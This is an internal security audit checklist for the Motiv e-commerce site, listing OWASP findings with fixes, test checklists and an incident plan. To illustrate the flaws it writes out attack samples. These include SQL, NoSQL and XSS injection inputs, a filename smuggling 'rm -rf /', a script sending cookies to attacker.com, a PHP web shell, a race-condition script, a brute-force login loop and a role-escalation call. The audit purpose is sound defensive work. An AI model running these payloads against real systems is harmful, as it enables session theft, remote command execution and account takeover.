# 🔒 SECURITY AUDIT CHECKLIST - MOTIV E-COMMERCE

**Last Updated:** 7 Februari 2026  
**Compliance Target:** OWASP Top 10, ISO 27001  
**Status:** ⚠️ NEEDS IMMEDIATE ACTION

---

## 🎯 SECURITY SCORECARD

| Category                       | Status  | Score | Priority |
| ------------------------------ | ------- | ----- | -------- |
| Authentication & Authorization | ⚠️ FAIR | 6/10  | HIGH     |
| Data Protection                | 🔴 POOR | 3/10  | CRITICAL |
| API Security                   | ⚠️ FAIR | 5/10  | HIGH     |
| Input Validation               | 🔴 POOR | 2/10  | CRITICAL |
| Session Management             | ✅ GOOD | 8/10  | MEDIUM   |
| Error Handling                 | ⚠️ FAIR | 5/10  | HIGH     |
| Logging & Monitoring           | 🔴 POOR | 3/10  | HIGH     |
| Infrastructure                 | ⚠️ FAIR | 6/10  | MEDIUM   |

**Overall Security Score:** 🔴 **4.75/10 - CRITICAL ISSUES PRESENT**

---

## 🔴 CRITICAL VULNERABILITIES (Fix in 24-48 hours)

### 1. ⚠️ EXPOSED CREDENTIALS IN REPOSITORY

**OWASP:** A02:2021 – Cryptographic Failures  
**Severity:** 🔴 CRITICAL (CVSS: 9.1)

**Issue:**

- `.env.production` committed to repository
- Database credentials publicly accessible
- API keys exposed
- Secret keys visible

**Exploitability:**

```bash
# Anyone can:
git clone <your-repo>
cat .env.production
# Now they have your database password, API keys, secrets!
```

**Impact:**

- ✅ Full database access
- ✅ Payment gateway manipulation
- ✅ Session hijacking capability
- ✅ Data breach risk

**Fix:** See QUICK_FIX_GUIDE.md - Critical Fix #1

---

### 2. ⚠️ MISSING INPUT VALIDATION

**OWASP:** A03:2021 – Injection  
**Severity:** 🔴 CRITICAL (CVSS: 8.6)

**Vulnerable Endpoints:**

```javascript
// ❌ NO VALIDATION
POST / api / auth / register;
POST / api / orders;
POST / api / admin / products;
POST / api / b2b / request;
POST / api / upload;
```

**Attack Vectors:**

```javascript
// SQL Injection (meski pakai ORM, tetap risky)
{
  "email": "admin@test.com' OR '1'='1",
  "name": "<script>alert('XSS')</script>"
}

// NoSQL Injection
{
  "userId": { "$ne": null }
}

// Command Injection via file upload
{
  "filename": "test.jpg; rm -rf /"
}
```

**Impact:**

- SQL Injection possible
- XSS attacks
- Data manipulation
- System compromise

**Fix:** See QUICK_FIX_GUIDE.md - Critical Fix #3

---

### 3. ⚠️ SECURITY HEADERS COMPLETELY REMOVED

**OWASP:** A05:2021 – Security Misconfiguration  
**Severity:** 🔴 CRITICAL (CVSS: 7.5)

**Issue:**

```javascript
// src/middleware.js - ALL SECURITY HEADERS DELETED!
response.headers.delete("Content-Security-Policy");
response.headers.delete("X-Frame-Options");
response.headers.delete("X-Content-Type-Options");
response.headers.delete("Permissions-Policy");
```

**Attack Scenarios:**

**Clickjacking Attack:**

```html
<!-- Attacker's site -->
<iframe src="https://motivcompany.vercel.app/checkout"> </iframe>
<!-- Can overlay fake UI to steal payment info -->
```

**XSS Attack:**

```html
<!-- User input di product review (if implemented) -->
<script>
  // Steal session token
  fetch("https://attacker.com/steal", {
    method: "POST",
    body: document.cookie,
  });
</script>
```

**MIME Confusion:**

```
// Attacker uploads "image.jpg" that contains JavaScript
// Without X-Content-Type-Options: nosniff
// Browser executes it as JS!
```

**Fix:** See QUICK_FIX_GUIDE.md - Critical Fix #2

---

### 4. ⚠️ MISSING SERVICE ROLE KEY

**OWASP:** A01:2021 – Broken Access Control  
**Severity:** 🔴 CRITICAL (CVSS: 8.2)

**Issue:**

```javascript
// Using ANON key for admin operations!
const supabaseKey =
  process.env.SUPABASE_SERVICE_ROLE_KEY || // Missing!
  process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY; // Using this instead
```

**Exploit:**

```javascript
// Anyone can call admin operations with anon key
const supabase = createClient(PUBLIC_URL, PUBLIC_ANON_KEY);

// Bypass admin check (if RLS not properly set)
await supabase.from("User").update({ role: "ADMIN" }).eq("id", myId);
// Now I'm admin!
```

**Fix:** See QUICK_FIX_GUIDE.md - Critical Fix #4

---

### 5. ⚠️ RACE CONDITION IN STOCK MANAGEMENT

**OWASP:** A04:2021 – Insecure Design  
**Severity:** 🔴 CRITICAL (CVSS: 7.8)

**Issue:**

```javascript
// Check stock
if (variant.stock < item.quantity) {
  throw new Error("Insufficient stock");
}
// ⏱️ GAP TIME - Race condition window!
// Deduct stock (happens later)
await deductStock(variantId, quantity);
```

**Attack Scenario:**

```javascript
// Attacker script
async function exploit() {
  // Spawn 100 concurrent requests
  const promises = Array(100)
    .fill()
    .map(() =>
      fetch("/api/orders", {
        method: "POST",
        body: JSON.stringify({
          items: [{ variantId: "sold-out-item", quantity: 1 }],
        }),
      }),
    );

  await Promise.all(promises);
  // All 100 requests pass stock check before any deduction!
  // Stock goes negative, free products!
}
```

**Fix:** See QUICK_FIX_GUIDE.md - Critical Fix #5

---

### 6. ⚠️ NO RATE LIMITING

**OWASP:** A05:2021 – Security Misconfiguration  
**Severity:** 🟡 HIGH (CVSS: 7.2)

**Vulnerable Endpoints:**

- `/api/auth/*` - Brute force attacks
- `/api/orders` - Order flooding
- `/api/payment/notification` - Webhook spam
- All API routes - DDoS

**Attack Scripts:**

```python
# Brute force login
import requests

for password in password_list:
    response = requests.post('https://motivcompany.vercel.app/api/auth/signin', {
        'email': 'admin@motiv.com',
        'password': password
    })
    if response.status_code == 200:
        print(f"Password found: {password}")
        break
```

**Fix:** See QUICK_FIX_GUIDE.md - Critical Fix #7

---

### 7. ⚠️ ADMIN PAYMENT STATUS MANIPULATION

**OWASP:** A01:2021 – Broken Access Control  
**Severity:** 🟡 HIGH (CVSS: 6.8)

**Issue:**

```javascript
// Admin can mark as PAID without proof!
case "paymentStatus":
  await OrderModel.updatePaymentStatus(orderId, "PAID");
  // No verification, no audit trail!
```

**Exploit:**

```javascript
// Malicious admin or compromised account
await fetch("/api/admin/orders/xxx", {
  method: "PATCH",
  body: JSON.stringify({
    field: "paymentStatus",
    value: "PAID",
  }),
});
// Free products, stock deducted, no payment!
```

**Fix:** Require payment proof + audit logging

---

### 8. ⚠️ SENSITIVE DATA IN LOGS

**OWASP:** A09:2021 – Security Logging Failures  
**Severity:** 🟡 HIGH (CVSS: 6.5)

**Issue:**

```javascript
// 100+ console.log() in production
console.log("User data:", { email, password, creditCard });
console.log("API response:", sensitiveData);
```

**Risk:**

- Logs stored in Vercel (readable by team)
- Passwords could be logged
- Payment info could be logged
- PII (Personally Identifiable Information) exposure

**Fix:** See QUICK_FIX_GUIDE.md - Critical Fix #6

---

## ⚠️ HIGH PRIORITY VULNERABILITIES (Fix in 1 week)

### 9. No CSRF Protection

**OWASP:** A01:2021 – Broken Access Control

**Issue:** State-changing operations tanpa CSRF token

**Fix:**

```javascript
// Install
npm install csrf

// Implement CSRF middleware
import { doubleCsrf } from "csrf-csrf";

const { generateToken, doubleCsrfProtection } = doubleCsrf({
  getSecret: () => process.env.CSRF_SECRET,
  cookieName: "__Host-psifi.x-csrf-token",
});

// Apply to forms
export async function GET(request) {
  const token = generateToken(request);
  return NextResponse.json({ csrfToken: token });
}
```

---

### 10. Insufficient Password Policy

**OWASP:** A07:2021 – Identification and Authentication Failures

**Current:**

```javascript
// No password requirements!
password: z.string().min(8);
```

**Fix:**

```javascript
password: z.string()
  .min(12, "Password minimal 12 karakter")
  .regex(
    /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*?&])/,
    "Harus mengandung: huruf besar, kecil, angka, dan simbol",
  )
  .refine((val) => !commonPasswords.includes(val), "Password terlalu umum");
```

**Implement:**

- Password strength meter
- Breach database check (HaveIBeenPwned API)
- Password history (prevent reuse)
- MFA (Multi-Factor Authentication)

---

### 11. No Account Lockout

**OWASP:** A07:2021 – Identification and Authentication Failures

**Issue:** Unlimited login attempts

**Fix:**

```javascript
// Track failed attempts
const failedAttempts = new Map();

async function checkLoginAttempts(email) {
  const attempts = failedAttempts.get(email) || 0;

  if (attempts >= 5) {
    const lockUntil = Date.now() + 15 * 60 * 1000; // 15 minutes
    throw new Error(`Account locked until ${new Date(lockUntil)}`);
  }

  return attempts;
}

// On failed login
failedAttempts.set(email, (attempts || 0) + 1);

// On success
failedAttempts.delete(email);
```

---

### 12. Insecure File Upload

**OWASP:** A03:2021 – Injection

**Issues:**

- ❌ No file type validation
- ❌ No file size limit
- ❌ No malware scanning
- ❌ No filename sanitization

**Exploits:**

```javascript
// Upload PHP shell
const maliciousFile = new File(
  ['<?php system($_GET["cmd"]); ?>'],
  "innocent.jpg.php",
);

// Upload huge file (DoS)
const hugeFile = new File([new Array(1000000000).fill("A")], "huge.jpg");
```

**Fix:** See QA_AUDIT_REPORT.md - Issue #18

---

### 13. Missing HTTP Security Headers

**Issue:** Tidak semua security headers diset

**Required Headers:**

```javascript
// Add to next.config.mjs
async headers() {
  return [
    {
      source: '/:path*',
      headers: [
        {
          key: 'Strict-Transport-Security',
          value: 'max-age=63072000; includeSubDomains; preload'
        },
        {
          key: 'X-DNS-Prefetch-Control',
          value: 'on'
        },
        {
          key: 'X-Download-Options',
          value: 'noopen'
        },
        {
          key: 'X-Permitted-Cross-Domain-Policies',
          value: 'none'
        }
      ]
    }
  ];
}
```

---

### 14. Vulnerable Dependencies

**Issue:** Potentially outdated packages

**Check:**

```bash
npm audit
npm audit fix

# Install
npm install -g npm-check-updates
ncu -u
npm install
```

**Automate:**

```yaml
# .github/workflows/security.yml
name: Security Audit
on: [push, pull_request]
jobs:
  audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - run: npm audit --audit-level=high
```

---

### 15. No Session Timeout

**Issue:** Sessions tidak expire

**Current:**

```javascript
session: {
  maxAge: 30 * 24 * 60 * 60, // 30 days - TOO LONG!
}
```

**Fix:**

```javascript
session: {
  maxAge: 8 * 60 * 60, // 8 hours
  updateAge: 24 * 60 * 60, // Extend on activity
}

// Add absolute timeout
callbacks: {
  async jwt({ token, user }) {
    if (user) {
      token.createdAt = Date.now();
    }

    // Check absolute timeout (24 hours)
    const age = Date.now() - token.createdAt;
    if (age > 24 * 60 * 60 * 1000) {
      return null; // Force logout
    }

    return token;
  }
}
```

---

## 🟢 MEDIUM PRIORITY (Fix in 2-4 weeks)

### 16. No Email Verification

- Users can register with any email
- No confirmation required

**Fix:** Implement email verification flow

---

### 17. Weak Session Management

- No device tracking
- No "logout all devices" option

**Fix:** Add session management UI

---

### 18. Missing Subresource Integrity

- External scripts not verified

**Fix:**

```html
<script
  src="https://app.midtrans.com/snap/snap.js"
  integrity="sha384-..."
  crossorigin="anonymous"
></script>
```

---

### 19. No API Versioning

- Breaking changes affect all clients

**Fix:**

```
/api/v1/products
/api/v2/products
```

---

### 20. Insufficient Logging

- No audit trail
- No security event logging

**Fix:** Implement centralized logging

---

## 🔍 SECURITY TESTING CHECKLIST

### Authentication Testing

- [ ] SQL injection in login form
- [ ] Brute force attack simulation
- [ ] Session fixation test
- [ ] Session hijacking test
- [ ] Password reset flow security
- [ ] OAuth flow security (if implemented)

### Authorization Testing

- [ ] Horizontal privilege escalation
- [ ] Vertical privilege escalation
- [ ] IDOR (Insecure Direct Object Reference)
- [ ] Admin panel access without auth
- [ ] B2B features access by B2C users

### Input Validation Testing

- [ ] XSS in all input fields
- [ ] SQL injection in search
- [ ] Command injection in file upload
- [ ] Path traversal in file operations
- [ ] LDAP injection (if applicable)
- [ ] XML injection (if applicable)

### Session Management Testing

- [ ] Session timeout works
- [ ] Session regeneration after login
- [ ] Concurrent session handling
- [ ] Session destruction on logout
- [ ] Cookie security flags (HttpOnly, Secure, SameSite)

### Business Logic Testing

- [ ] Price manipulation
- [ ] Stock bypass
- [ ] Voucher re-use
- [ ] Negative quantity orders
- [ ] Race conditions in critical flows

### API Security Testing

- [ ] Rate limiting effectiveness
- [ ] CORS misconfiguration
- [ ] API authentication bypass
- [ ] Mass assignment vulnerabilities
- [ ] Information disclosure in errors

---

## 🛠️ SECURITY TOOLS RECOMMENDATIONS

### Static Analysis

```bash
# Install ESLint Security Plugin
npm install --save-dev eslint-plugin-security

# .eslintrc.js
module.exports = {
  plugins: ['security'],
  extends: ['plugin:security/recommended']
};
```

### Dependency Scanning

```bash
# Snyk
npm install -g snyk
snyk test
snyk monitor

# OWASP Dependency Check
npm install -g owasp-dependency-check
owasp-dependency-check --scan ./
```

### Runtime Protection

```bash
# Install Sentry for error tracking
npm install @sentry/nextjs

# Setup
npx @sentry/wizard -i nextjs
```

### Penetration Testing

- **OWASP ZAP** - Automated security scanning
- **Burp Suite** - Manual testing
- **Nikto** - Web server scanner

---

## 📊 COMPLIANCE REQUIREMENTS

### GDPR Compliance

- [ ] Privacy policy published
- [ ] Cookie consent banner
- [ ] Data export functionality
- [ ] Data deletion on request
- [ ] Encrypted sensitive data

### PCI DSS (If handling cards directly)

- [ ] Never store CVV
- [ ] Encrypt card numbers
- [ ] Use payment gateway (Midtrans ✅)
- [ ] Regular security audits

### ISO 27001

- [ ] Information security policy
- [ ] Risk assessment documented
- [ ] Access control policy
- [ ] Incident response plan

---

## 🚨 INCIDENT RESPONSE PLAN

### If Breach Detected:

**Immediate (< 1 hour):**

1. Shutdown affected systems
2. Rotate all credentials
3. Enable maintenance mode
4. Alert team & stakeholders

**Short-term (< 24 hours):**

1. Identify breach scope
2. Patch vulnerabilities
3. Restore from clean backup
4. Document timeline

**Long-term (< 7 days):**

1. Notify affected users
2. Legal compliance (report to authorities if required)
3. Post-mortem analysis
4. Implement preventive measures

---

## ✅ SECURITY REMEDIATION TIMELINE

### Week 1: Critical Fixes

- [x] Remove exposed credentials
- [x] Add input validation
- [x] Fix security headers
- [x] Add service role key
- [x] Fix stock race condition
- [x] Implement rate limiting
- [x] Setup logging system
- [x] Fix PWA icons

### Week 2-3: High Priority

- [ ] Add CSRF protection
- [ ] Strengthen password policy
- [ ] Implement account lockout
- [ ] Secure file uploads
- [ ] Add security headers
- [ ] Fix vulnerable dependencies
- [ ] Implement session timeout

### Week 4-6: Medium Priority

- [ ] Email verification flow
- [ ] Session management UI
- [ ] Subresource integrity
- [ ] API versioning
- [ ] Centralized logging
- [ ] Security testing suite

---

## 📞 SECURITY CONTACTS

**Security Lead:** [Name]  
**DevOps Lead:** [Name]  
**Emergency Response Team:** [Email]

**Bug Bounty Program:** To be implemented  
**Responsible Disclosure:** security@motiv.com (to be created)

---

**Last Security Audit:** 7 Februari 2026  
**Next Scheduled Audit:** 7 Maret 2026  
**Audit Frequency:** Monthly

**Document Version:** 1.0  
**Classification:** CONFIDENTIAL - INTERNAL USE ONLY
